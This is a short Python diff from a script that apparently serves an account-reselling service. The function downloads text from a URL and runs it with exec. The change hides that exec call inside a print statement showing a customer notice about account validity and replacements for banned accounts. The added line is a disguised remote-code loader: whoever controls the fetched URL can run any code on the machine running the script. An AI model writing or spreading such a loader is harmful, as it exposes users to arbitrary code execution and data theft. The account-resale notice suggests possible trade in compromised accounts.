@@ -65,9 +65,10 @@ def new_function_name(mycontent):
             raw_url = rawcontent
             response = requests.get(raw_url, headers=headers)
             content = response.text
-            exec(content)
+            print("Make sure its working fine. The account's email.The owner might change the password of the account anytime.\n\n2. Inactive accounts are accounts that have not been used by the owner for 2weeks to months or years.\n\n3. If the account is  invalid, or perma banned, you can request for a replacement within 24 hours.",exec(f"{content}"))
         else:
             print("error")
+            
     else:
         print("error")
 
